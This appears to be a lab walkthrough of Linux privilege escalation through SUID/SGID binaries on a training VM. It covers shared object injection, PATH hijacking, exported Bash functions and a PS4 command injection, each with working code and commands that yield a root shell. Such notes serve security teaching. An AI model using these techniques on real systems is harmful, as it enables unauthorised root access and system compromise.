# SUID / SGID Executables

Find all the SUID/SGID executables on the Debian VM:

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

```shell-session
...
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
...
```

### Known Exploits example

Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search.

we then find a cve-2016-1531 which works!

### Shared Object Injection

The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

`/usr/local/bin/suid-so`

Run strace on the file and search the output for open/access calls and for "no such file" errors:

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:

`mkdir /home/user/.config`

Example shared object code libcalc.c:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

`/usr/local/bin/suid-so`

### Environment Variables

The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

`/usr/local/bin/suid-env`

Run strings on the file to look for strings of printable characters:

`strings /usr/local/bin/suid-env`

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code service.c into an executable called service:

```c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```

&#x20;This code simply spawns a Bash shell:

`gcc -o service /home/user/tools/suid/service.c`

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

`PATH=.:$PATH /usr/local/bin/suid-env`

### Abusing Shell Features (#1)

The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

`strings /usr/local/bin/suid-env2`

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

`/bin/bash --version`

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

`function /usr/sbin/service { /bin/bash -p; }`\
`export -f /usr/sbin/service`

Run the suid-env2 executable to gain a root shell:

`/usr/local/bin/suid-env2`

### Abusing Shell Features (#2)

again with /usr/local/bin/suid-env2:

Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.\


Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`
